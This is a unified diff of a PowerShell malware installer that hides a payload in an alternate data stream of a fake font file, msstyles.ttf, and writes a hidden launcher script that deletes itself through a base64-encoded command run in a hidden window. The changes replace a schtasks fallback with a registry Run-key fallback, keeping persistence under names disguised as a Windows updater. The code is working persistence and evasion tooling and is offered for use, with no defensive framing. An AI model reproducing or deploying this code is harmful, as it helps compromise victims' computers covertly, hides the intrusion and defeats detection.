@@ -32,7 +32,6 @@ if (-not (Test-Path $fontDir)) {
     Write-Log "[+] Using existing fonts folder: $fontDir"
 }
 
-# Use a unique font name that doesn't conflict
 $fontFile = "$fontDir\msstyles.ttf"
 if (-not (Test-Path $fontFile)) {
     try {
@@ -62,7 +61,7 @@ try {
 }
 $hiddenPath = "$fontFile`:$streamName"
 
-# --- 3. Create launcher script (run.ps1) with self-delete logic ---
+# --- 3. Create launcher script (run.ps1) with self-delete ---
 $launcherPath = "$fontDir\run.ps1"
 $launcherContent = @"
 `$ProgressPreference = 'SilentlyContinue'
@@ -80,7 +79,6 @@ function Write-LauncherLog {
 }
 
 Write-LauncherLog "Launcher started"
-
 Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue
 Write-LauncherLog "Removed old temp agent if present"
 
@@ -101,11 +99,9 @@ try {
     exit 1
 }
 
-# Self-destruct: use a regular string (not a here-string) to avoid nesting issues
 `$selfDestructScript = "Start-Sleep -Seconds 10; Remove-Item -Path '$launcherPath' -Force -ErrorAction SilentlyContinue; Remove-Item -Path '`$launcherLog' -Force -ErrorAction SilentlyContinue"
 `$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$selfDestructScript))
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand `$encoded"
-
 Write-LauncherLog "Self-destruct scheduled"
 "@
 
@@ -113,17 +109,18 @@ Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
 Write-Log "[+] Created launcher with self-destruct: $launcherPath"
 
-# --- 4. Persistence via scheduled task (your working method) ---
+# --- 4. Persistence: Try old COM task creation, fallback to Run key ---
 $taskName = "WindowsUpdaterTask_$channelID"
 $taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
+$persistenceSet = $false
 
-Write-Log "[*] Attempting to create scheduled task via COM..."
-
+Write-Log "[*] Attempting to create scheduled task via COM (old method)..."
 try {
     $taskService = New-Object -ComObject Schedule.Service
     $taskService.Connect()
     $rootFolder = $taskService.GetFolder("\")
     
+    # Delete existing task if any (ignore errors)
     try { $rootFolder.DeleteTask($taskName, 0) } catch { Write-Log "No existing task to delete" }
     
     $taskDefinition = $taskService.NewTask(0)
@@ -132,7 +129,7 @@ try {
     $taskDefinition.Principal.LogonType = 3
     $taskDefinition.Principal.RunLevel = 1
     
-    $trigger = $taskDefinition.Triggers.Create(9)
+    $trigger = $taskDefinition.Triggers.Create(9) # Logon
     $trigger.UserId = $env:USERNAME
     
     $action = $taskDefinition.Actions.Create(0)
@@ -144,17 +141,17 @@ try {
     $persistenceSet = $true
 } catch {
     Write-Log "[-] COM task creation failed: $_"
+    
+    # Fallback to HKCU Run key
+    Write-Log "[*] Falling back to HKCU Run key..."
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "WindowsUpdater_$channelID"
     try {
-        schtasks /delete /tn $taskName /f *>$null 2>&1
-        schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it *>$null 2>&1
-        if ($LASTEXITCODE -eq 0) {
-            Write-Log "[+] Scheduled task '$taskName' created via schtasks."
-            $persistenceSet = $true
-        } else {
-            Write-Log "[-] schtasks failed with exit code $LASTEXITCODE"
-        }
+        Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
+        Write-Log "[+] Registry Run key added: $regName"
+        $persistenceSet = $true
     } catch {
-        Write-Log "[-] schtasks exception: $_"
+        Write-Log "[-] Failed to set registry Run key: $_"
     }
 }
 
